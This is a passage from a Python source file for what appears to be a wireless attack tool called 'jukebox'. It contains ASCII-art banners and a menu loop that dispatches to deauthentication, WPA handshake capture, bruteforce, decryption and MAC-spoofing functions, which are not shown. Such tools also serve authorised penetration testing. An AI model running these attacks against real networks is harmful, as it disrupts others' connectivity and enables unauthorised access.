    "⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀",
    "⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀",
    "⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀",
    "⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀",
    "⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆",
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇",
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇",
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁",
    '\n'
],
ascii_arts = [
    [
        "       _       __        __              ",
        "      (_)_  __/ /_____  / /_  ____  _  __",
        "     / / / / / //_/ _ \\/ __ \\/ __ \\| |/_/",
        "    / / /_/ / ,< /  __/ /_/ / /_/ />  <  ",
        " __/ /\\__,_/_/|_|\\___/_.___/\\____/_/|_|  ",
        "/___/                                    "
    ],
    [
        "     ▄█ ███    █▄     ▄█   ▄█▄    ▄████████ ▀█████████▄   ▄██████▄  ▀████    ▐████▀ ",
        "    ███ ███    ███   ███ ▄███▀   ███    ███   ███    ███ ███    ███   ███▌   ████▀  ",
        "    ███ ███    ███   ███▐██▀     ███    █▀    ███    ███ ███    ███    ███  ▐███    ",
        "    ███ ███    ███  ▄█████▀     ▄███▄▄▄      ▄███▄▄▄██▀  ███    ███    ▀███▄███▀    ",
        "    ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ███    ███    ████▀██▄     ",
        "    ███ ███    ███   ███▐██▄     ███    █▄    ███    ██▄ ███    ███   ▐███  ▀███    ",
        "    ███ ███    ███   ███ ▀███▄   ███    ███   ███    ███ ███    ███  ▄███     ███▄  ",
        "█▄ ▄███ ████████▀    ███   ▀█▀   ██████████ ▄█████████▀   ▀██████▀  ████       ███▄ ",
        "▀▀▀▀▀▀               ▀                                                               "
    ],
    [
        "________       ______      ______               ",
        "______(_)___  ____  /_________  /___________  __",
        "_____  /_  / / /_  //_/  _ \\_  __ \\  __ \\_  |/_/",
        "____  / / /_/ /_  ,<  /  __/  /_/ / /_/ /_>  <  ",
        "___  /  \\__,_/ /_/|_| \\___//_.___/\\____//_/|_|  ",
        "/___/                                            "
    ],
    [
        " ▄▄▄██▀▀▀█    ██  ██ ▄█▀▓█████  ▄▄▄▄    ▒█████  ▒██   ██▒",
        "   ▒██   ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░",
        "   ░██  ▓██  ▒██░▓███▄░ ▒███   ▒██▒ ▄██▒██░  ██▒░░  █   ░",
        "▓██▄██▓ ▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██░█▀  ▒██   ██░ ░ █ █ ▒ ",
        " ▓███▒  ▒▒█████▓ ▒██▒ █▄░▒████▒░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒",
        " ▒▓▒▒░  ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░",
        " ▒ ░▒░  ░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░",
        " ░ ░ ░   ░░░ ░ ░ ░ ░░ ░    ░    ░    ░ ░ ░ ░ ▒   ░    ░  ",
        " ░   ░     ░     ░  ░      ░  ░ ░          ░ ░   ░    ░  ",
        "                                     ░                   "
    ],
    [
        " ▄▄▄██▀▀▀█    ██  ██ ▄█▀▓█████  ▄▄▄▄    ▒█████  ▒██   ██▒",
        "   ▒██   ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░",
        "   ░██  ▓██  ▒██░▓███▄░ ▒███   ▒██▒ ▄██▒██░  ██▒░░  █   ░",
        "▓██▄██▓ ▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██░█▀  ▒██   ██░ ░ █ █ ▒ ",
        " ▓███▒  ▒▒█████▓ ▒██▒ █▄░▒████▒░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒",
        " ▒▓▒▒░  ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░",
        " ▒ ░▒░  ░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░",
        " ░ ░ ░   ░░░ ░ ░ ░ ░░ ░    ░    ░    ░ ░ ░ ░ ▒   ░    ░  ",
        " ░   ░     ░     ░  ░      ░  ░ ░          ░ ░   ░    ░  ",
        "                                     ░                   "
    ],
    [
        "      ███             █████               █████                         ",
        "     ░░░             ░░███               ░░███                          ",
        "     █████ █████ ████ ░███ █████  ██████  ░███████   ██████  █████ █████",
        "    ░░███ ░░███ ░███  ░███░░███  ███░░███ ░███░░███ ███░░███░░███ ░░███ ",
        "     ░███  ░███ ░███  ░██████░  ░███████  ░███ ░███░███ ░███ ░░░█████░  ",
        "     ░███  ░███ ░███  ░███░░███ ░███░░░   ░███ ░███░███ ░███  ███░░░███ ",
        "     ░███  ░░████████ ████ █████░░██████  ████████ ░░██████  █████ █████",
        "     ░███   ░░░░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░░░░░   ░░░░░░  ░░░░░ ░░░░░ ",
        " ███ ░███                                                                ",
        "░░██████                                                                 ",
        " ░░░░░░                                                                 "
    ]
]


def interface_options():
    for options in Interface_Options:
        print(options)


def wireless_options():
    for options in wireless_attacks:
        print(options)


Interface = ["Interface", interface_options]
Wireless = ["Wireless", wireless_options]

Section = Interface
Previous_Section = Interface

if __name__ == "__main__":
    while exit != "exit":
        interface_mode = ''
        if selected_interface != '' and check_if_selected_interface_in_monitor_mode:
            interface_mode = 'Monitor'
        elif selected_interface != '' and not check_if_selected_interface_in_monitor_mode:
            interface_mode = 'Managed'
        clear()
        art = random.choice(ascii_arts)
        for i in art:
            print(i)
        print()
        Interface_Options = [
            f'{blue("--------------------------------------------------------")}',
            f'{green("1)")} Select Interface',
            f'{blue("--------------------------------------------------------")}',
            f"{green('2)')} Change Interface to monitor mode",
            f"{green('3)')} Change Interface to managed mode",
            f"{green('4)')} Change Interface MAC Address",
            f'{blue("--------------------------------------------------------")}',
            f'{yellow("Interface ")}     : {cyan(selected_interface)}',
            f'{yellow("Interface Mode")} : {cyan(interface_mode)}',
            f'{yellow("Interface MAC ")} : {cyan(interface_mac_address)}',
            f'{blue("--------------------------------------------------------")}',
            f"{green('N)')} Network Attacks",
            f'{blue("--------------------------------------------------------")}',
            f"{green('exit')} to close the program",
            f'{blue("--------------------------------------------------------")}',

        ]

        wireless_attacks = [
            f"{blue('------------------------------------------------------------------')}",
            f"{green('1)')} Select a {yellow('target AP')}",
            f"{green('2)')} Select a {yellow('target OUI')}",
            f"{green('3)')} Select a {yellow('target Device')} in {yellow('target AP')}",
            f"{blue('------------------------------------------------------------------')}",
            f"{green('U)')} UPDATE NETWORK INFORMATION",
            f"{blue('------------------------------------------------------------------')}",
            f"{green('D1)')} Deauth {yellow('target AP')}",
            f"{green('D2)')} Deauth {yellow('target Device')} in {yellow('target AP')}",
            f"{green('D3)')} Deauth {yellow('All AP`s')}      in {yellow('target OUI')} (interval/roundrobin) ",
            f"{green('D4)')} Deauth {yellow('ALL Devices')}   in {yellow('target AP')}  (interval/roundrobin)",
            f"{blue('------------------------------------------------------------------')}",
            f"{green('C1)')} Capture Packets   on      {yellow('target AP')}",
            f"{green('C2)')} Capture Handshake of      {yellow('target AP')}",
            f"{green('C3)')} Bruteforce attack on      {yellow('target AP')} With Capture File",
            f"{green('C4)')} Decrypt Capture Packet of {yellow('target AP')} WPA/WPA2",
            f"{blue('------------------------------------------------------------------')}",
            f"{green('B1)')} Deauth and Capture Handshake of {yellow('ALL Networks in range')}",
            f"{green('B2)')} Deauth and Capture Handshake of {yellow('target AP')}",
            f"{blue('------------------------------------------------------------------')}",
            f"{green('G1)')} Graph the Network using Capture File",
            f"{blue('------------------------------------------------------------------')}",
            f"{yellow('Interface')}         {green(':')}  {cyan(selected_interface)}",
            f"{yellow('Interface MODE')}    {green(':')}  {cyan(interface_mode)}",
            f"{yellow('Interface MAC ')}    {green(':')}  {cyan(interface_mac_address)}",
            f"{blue('------------------------------------------------------------------')}",
            f"{yellow('target AP SSID')}    {green(':')}  {cyan(target_ap)}",
            f"{yellow('target AP AUTH')}    {green(':')}  {cyan(target_ap_authentication)}",
            f"{yellow('target AP BSSID')}   {green(':')}  {cyan(target_bssid)}",
            f"{yellow('target AP CHANNEL')} {green(':')}  {cyan(target_channel)}",
            f"{yellow('target OUI')}        {green(':')}  {cyan(target_router_oui)}",
            f"{yellow('target DEVICE')}     {green(':')}  {cyan(target_device)}",
            f"{blue('------------------------------------------------------------------')}",
            f"{green('RESET')}  {cyan('|')} {green('RETURN')}   {cyan('|')} {green('EXIT')}",
            f"{blue('------------------------------------------------------------------')}",
        ]

        Section[1]()
        match input(f"\n{magenta('jukebox > ')}").lower():
            case "return":
                Section = Previous_Section
            case "exit":
                break
            case "reset":
                if Section[0] == "Wireless":
                    selected_interface = ""
                    target_ap = ""
                    target_bssid = ""
                    target_channel = ""
                    target_device = ""
                    target_ap_authentication = ""
                    target_router_oui = ""
                    interface_mac_address = ""
                    device_list_of_target_ap = []
                    ssid_map = {}
                    ssid_counter = ''
                    terminal_pids = []
                    Section = Interface
                    Previous_Section = Interface
            case '1':
                if Section[0] == "Interface":
                    change_interface()
                elif Section[0] == "Wireless":
                    select_target_ap()
            case '2':
                if Section[0] == "Interface":
                    switch_interface_to_monitor_mode()
                elif Section[0] == "Wireless":
                    select_target_oui()
            case '3':
                if Section[0] == "Interface":
                    switch_interface_to_managed_mode()
                elif Section[0] == 'Wireless':
                    select_target_device()
            case '4':
                if Section[0] == "Interface":
                    spoof_mac_of_interface_with_random_byte()
            case 'u':
                if Section[0] == "Wireless":
                    scan_for_networks()
            case 'd1':
                if Section[0] == "Wireless":
                    deauthentication()
            case 'd2':
                if Section[0] == "Wireless":
                    device_deauthentication()
            case 'd3':
                if Section[0] == "Wireless":
                    deauth_by_oui()
            case 'd4':
                if Section[0] == "Wireless":
                    deauth_devices_in_target_ap()
            case 'c1':
                if Section[0] == "Wireless":
                    capture_packets()
            case 'c2':
                if Section[0] == "Wireless":
                    capture_handshake()
            case 'c3':
                if Section[0] == "Wireless":
                    bruteforce_handshake_capture()
            case 'c4':
                if Section[0] == "Wireless":
                    airdecap_wpa()
            case 'b1':
                if Section[0] == "Wireless":
                    besside()
            case 'b2':
                if Section[0] == "Wireless":
                    besside_target_ap()
            case 'g1':
                if Section[0] == "Wireless":
                    graph_networks()
            case 'n':
                if selected_interface == "":
                    print("Cannot continue with wireless attacks without selecting a interface")
                    input('Press enter to continue')
                elif not check_if_selected_interface_in_monitor_mode():
                    print(f"Cannot continue with wireless attacks without {green('Monitor Mode')}")
                    if input(f'Switch {green(selected_interface)} to monitor mode Y/N : ').lower() == 'y':
                        switch_interface_to_monitor_mode()
                elif Section[0] == "Interface":
                    Previous_Section = Section
                    Section = Wireless
